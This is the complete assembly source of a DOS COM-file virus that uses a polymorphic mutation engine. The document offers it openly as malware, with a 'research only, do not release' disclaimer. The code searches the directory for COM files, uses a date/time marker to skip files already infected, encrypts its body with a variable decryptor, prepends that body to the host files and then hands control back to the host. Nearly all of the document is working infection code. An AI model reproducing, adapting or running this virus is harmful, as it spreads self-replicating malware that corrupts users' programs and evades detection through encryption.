;VMEDEMO.ASM
;A small Visible Mutation Engine based COM infector.

;This Virus for research purposes only. Please do not release!
;Please execute it only on a carefully controlled system, and only
;if you know what you're doing!

                .model  tiny            ;Tiny model to create a COM file

                .code

                extrn   host:near               ;host program
                extrn   encrypt:near            ;eagle mutation engine

;DTA definitions
DTA             EQU     0000H           ;Disk transfer area
FSIZE           EQU     DTA+1AH         ;file size location in file search
FNAME           EQU     DTA+1EH         ;file name location in file search

                ORG     100H

;******************************************************************************
;The virus starts here.

VIRSTART:
                call    GETLOC
GETLOC:         pop     bp
                sub     bp,OFFSET GETLOC                ;heres where virus starts
                mov     ax,ds
                add     ax,1000H
                mov     es,ax                           ;upper segment is this one + 1000H

;Now it's time to find a viable file to infect. We will look for any COM file
;and see if the virus is there already.
FIND_FILE:
                push    ds
                mov     ds,ax
                xor     dx,dx                           ;move dta to high segment
                mov     ah,1AH                          ;so we don't trash the command line
                int     21H                             ;which the host is expecting
                pop     ds
                mov     dx,OFFSET COMFILE
                add     dx,bp
                mov     ch,3FH                          ;search for any file, no matter what attribute
                mov     ah,4EH                          ;DOS search first function
                int     21H
CHECK_FILE:     jnc     NXT1
                jmp     ALLDONE                         ;no COM files to infect
NXT1:           mov     dx,FNAME                        ;first open the file
                push    ds
                push    es
                pop     ds
                mov     ax,3D02H                        ;r/w access open file, since we'll want to write to it
                int     21H
                pop     ds
                jc      NEXT_FILE
                mov     bx,ax                           ;put file handle in bx, and leave it there for the duration
                mov     ax,5700H                        ;get file attribute
                int     21H
                mov     ax,cx
                xor     ax,dx                           ;date xor time mod 10 = 3 for infected file
                xor     dx,dx
                mov     cx,10
                div     cx
                cmp     dx,3
                jnz     INFECT_FILE                     ;not 3, go infect

NEXT_FILE:      mov     ah,4FH                          ;look for another file
                int     21H
                jmp     SHORT CHECK_FILE                ;and go check it out

COMFILE         DB      '*.COM',0

;When we get here, we've opened a file successfully, and read it into memory.
;In the high segment, the file is set up exactly as it will look when infected.
;Thus, to infect, we just rewrite the file from the start, using the image
;in the high segment.
INFECT_FILE:
                push    bx                              ;save file handle
                mov     si,100H                         ;ds:si==>code to encrypt
                add     si,bp
                mov     di,100H                         ;es:di==>@ of encr code
;                mov     dx,32                           ;decryptor size
                xor     dx,dx                           ;random decryptor size
                mov     cx,OFFSET HOST - 100H           ;size of code to encrypt
                mov     bx,100H                         ;starting offset
                call    ENCRYPT                         ;on exit, es:di=code cx=size
                pop     bx

                push    ds
                push    es
                pop     ds
                push    cx
                mov     di,FSIZE
                mov     dx,cx
                add     dx,100H                         ;put host here
                mov     cx,[di]                         ;get file size for reading into buffer
                mov     ah,3FH                          ;DOS read function
                int     21H

                xor     cx,cx
                mov     dx,cx                           ;reset file pointer to start of file
                mov     ax,4200H
                int     21H
                pop     cx
                add     cx,[di]

                mov     dx,100H
                mov     ah,40H
                int     21H                             ;write encrypted virus to file
                pop     ds

                mov     ax,5700H                        ;get date & time on file
                int     21H
                push    dx
                mov     ax,cx                           ;fix it
                xor     ax,dx
                mov     cx,10
                xor     dx,dx
                div     cx
                mul     cx
                add     ax,3
                pop     dx
                xor     ax,dx
                mov     cx,ax
                mov     ax,5701H                        ;and save it
                int     21H

EXIT_ERR:
                mov     ah,3EH                          ;close the file
                int     21H

;The infection process is now complete. This routine moves the host program
;down so that its code starts at offset 100H, and then transfers control to it.
ALLDONE:
                mov     ax,ss                   ;set ds, es to low segment again
                mov     ds,ax
                mov     es,ax
                pushf
                push    ax                      ;prep for iret to host
                mov     dx,80H                  ;restore dta to original value
                mov     ah,1AH                  ;for compatibility
                int     21H
                mov     di,100H                 ;prep to move host back to original location
                mov     si,OFFSET HOST
                add     si,bp
                push    di
                mov     ax,sp
                sub     ax,6
                push    ax
                mov     ax,00CFH                ;iret on the stack
                push    ax
                mov     ax,0A4F3H               ;rep movsb on the stack
                push    ax
                mov     cx,sp                   ;move code, but don't trash the stack
                sub     cx,si
                cli                             ;don't allow stack to trash while we go crazy
                add     sp,4
                ret

                END     VIRSTART




